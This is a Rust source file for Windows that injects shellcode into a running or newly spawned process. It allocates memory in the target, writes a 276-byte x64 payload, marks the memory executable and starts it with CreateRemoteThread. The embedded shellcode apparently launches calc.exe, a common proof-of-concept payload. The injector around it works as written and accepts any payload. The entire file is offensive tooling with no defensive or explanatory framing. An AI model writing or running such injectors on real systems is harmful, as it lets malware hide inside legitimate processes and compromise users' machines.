use std::ffi::CStr;
use std::intrinsics::copy_nonoverlapping;
use std::mem::transmute;
use std::process;

use winapi::ctypes::c_void;

use winapi::shared::minwindef::BOOL;
use winapi::shared::ntdef::{LPCSTR, NULL, NULL64};
use winapi::um::memoryapi::{VirtualProtect, VirtualProtectEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    CreateProcessA, CreateRemoteThread, LPPROCESS_INFORMATION, LPSTARTUPINFOA, PROCESS_INFORMATION,
    STARTUPINFOA, STARTUPINFOW,
};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::tlhelp32::Process32Next;
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS,
};
use winapi::um::{
    errhandlingapi::GetLastError,
    memoryapi::VirtualAllocEx,
    processthreadsapi::OpenProcess,
    tlhelp32::{CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, TH32CS_SNAPPROCESS},
};

fn get_remote_process_handle(
    process_name: &str,
    process_id: &mut u32,
    process_handle: &mut *const c_void,
) -> bool {
    unsafe {
        let mut proc: PROCESSENTRY32 = std::mem::zeroed();

        proc.dwSize = size_of::<PROCESSENTRY32>() as u32;

        let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if snapshot_handle.is_null() {
            println!("[-] CreateToolhelp32Snapshot failed: {}", GetLastError());
            return false;
        }

        let status: BOOL = Process32First(snapshot_handle, &mut proc);

        if status == 0 {
            println!("[-] Process32First failed: {}", GetLastError());
            return false;
        }

        loop {
            let proc_name = CStr::from_ptr(proc.szExeFile.as_ptr()).to_str().unwrap();
            if proc_name.to_lowercase() == process_name.to_lowercase() {
                *process_id = proc.th32ProcessID;
                *process_handle = OpenProcess(PROCESS_ALL_ACCESS, 1, proc.th32ProcessID);
                if process_handle.is_null() {
                    println!("[-] OpenProcess failed: {}", GetLastError());
                    return false;
                }
                break;
            }

            if Process32Next(snapshot_handle, &mut proc) == 0 {
                break;
            }
        }

        if *process_handle == NULL {
            return false;
        }
    }

    return true;
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn create_process(
    process_name: &str,
    process_id: &mut u32,
    process_handle: &mut *const c_void,
) -> bool {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let status = CreateProcessA(
            std::ptr::null_mut(),
            process_name.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi,
        );

        if status == 0 {
            println!("[-] CreateProcessA failed: {}", GetLastError());
            return false;
        }

        *process_id = pi.dwProcessId;
        *process_handle = pi.hProcess as *const c_void;
    }

    true
}

fn main() {
    let buf: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    let args = std::env::args().collect::<Vec<String>>();

    if args.len() != 2 {
        println!("Usage: {} <process_name>", args[0]);
        return;
    }

    let process_name = args.get(1).unwrap();

    let mut process_id = 0;
    let mut process_handle: *const c_void = std::ptr::null();

    if get_remote_process_handle(process_name, &mut process_id, &mut process_handle) {
        println!("[+] Found process {} with PID {}", process_name, process_id);
    } else {
        // println!("[-] Could not find process {}", process_name);
        create_process(process_name, &mut process_id, &mut process_handle);
    }

    unsafe {
        let shellcode_address = VirtualAllocEx(
            process_handle as *mut c_void,
            std::ptr::null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if shellcode_address.is_null() {
            println!("[-] VirtualAllocEx failed: {}", GetLastError());
            process::exit(1);
        }

        println!("[+] Allocated memory at address {:p}", shellcode_address);

        let mut bytes_written: usize = 0;

        let status = WriteProcessMemory(
            process_handle as *mut c_void,
            shellcode_address,
            buf.as_ptr() as *const c_void,
            buf.len(),
            &mut bytes_written,
        );

        if status == 0 {
            println!("[-] WriteProcessMemory failed: {}", GetLastError());
        }

        println!("[+] Wrote {} bytes to process memory", bytes_written);

        let mut old_protect = 0;

        let status = VirtualProtectEx(
            process_handle as *mut c_void,
            shellcode_address as *mut c_void,
            buf.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status == 0 {
            println!("[-] VirtualAllocEx failed: {}", GetLastError());
        }

        pause();

        let mut thread_id: u32 = 0;

        let thread_handle = CreateRemoteThread(
            process_handle as *mut c_void,
            std::ptr::null_mut(),
            0,
            Some(transmute(shellcode_address as *const c_void)),
            std::ptr::null_mut(),
            0,
            thread_id as *mut u32,
        );

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }
}
